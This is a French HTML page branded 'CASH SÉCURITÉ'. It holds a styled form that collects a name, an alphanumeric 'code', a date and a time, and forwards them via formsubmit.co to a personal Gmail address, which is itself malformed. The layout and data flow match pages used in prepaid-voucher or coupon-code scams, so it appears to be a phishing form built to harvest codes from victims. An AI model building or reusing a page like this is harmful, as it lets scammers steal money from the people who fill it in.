<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>CASH SÉCURITÉ - Formulaire</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
      color: #ffffff;
    }

    .header {
      text-align: center;
      padding: 30px 10px;
      background-color: rgba(0, 0, 0, 0.85);
    }

    .header img {
      width: 100px;
      margin-bottom: 10px;
    }

    .header h1 {
      margin: 0;
      font-size: 32px;
      color: #00ff99;
    }

    .form-container {
      max-width: 500px;
      margin: 40px auto;
      padding: 30px;
      background-color: rgba(0, 0, 0, 0.85);
      border-radius: 15px;
      box-shadow: 0 0 20px #00ff99;
    }

    .form-container label {
      display: block;
      margin-bottom: 5px;
      font-weight: 600;
    }

    .form-container input {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      border-radius: 8px;
      border: none;
      font-size: 16px;
    }

    .form-container input[type="submit"] {
      background-color: #00ff99;
      color: #000;
      cursor: pointer;
      font-weight: bold;
      transition: background 0.3s;
    }

    .form-container input[type="submit"]:hover {
      background-color: #0f9;
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="logo.jpg" alt="Logo de l'entreprise">
    <h1>CASH SÉCURITÉ</h1>
  </div>

  <div class="form-container">
    <form action="https://formsubmit.co/Alexandersoros333@gmail.comail.com" method="POST">
      <label for="nom">Nom :</label>
      <input type="text" id="nom" name="nom" required>

      <label for="code">Code (Alphanumérique) :</label>
      <input type="text" id="code" name="code" required pattern="[A-Za-z0-9]+">

      <label for="date">Date :</label>
      <input type="date" id="date" name="date" required>

      <label for="heure">Heure :</label>
      <input type="time" id="heure" name="heure" required>

      <!-- Redirection vers merci.html -->
      <input type="hidden" name="_next" value="merci.html">

      <input type="submit" value="Envoyer">
    </form>
  </div>

</body>
</html>
